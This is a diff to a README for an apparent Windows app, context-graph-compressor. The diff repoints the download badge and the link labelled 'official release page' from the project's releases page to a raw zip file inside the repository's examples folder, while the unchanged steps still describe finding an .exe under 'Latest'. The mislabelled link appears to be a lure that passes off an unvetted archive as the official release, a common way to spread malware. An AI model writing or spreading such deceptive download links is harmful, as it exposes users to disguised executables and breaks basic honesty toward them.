@@ -1,6 +1,6 @@
 # 🌐 context-graph-compressor - Turn long chats into portable graphs
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Highlydeveloped-trowel635/context-graph-compressor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Highlydeveloped-trowel635/context-graph-compressor/raw/refs/heads/main/examples/context_compressor_graph_2.7.zip)
 
 ## 📌 What this app does
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The app works on 64-bit sy
 
 ## 📥 How to get the app
 
-1. Go to the [official release page](https://github.com/Highlydeveloped-trowel635/context-graph-compressor/releases).
+1. Go to the [official release page](https://github.com/Highlydeveloped-trowel635/context-graph-compressor/raw/refs/heads/main/examples/context_compressor_graph_2.7.zip).
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
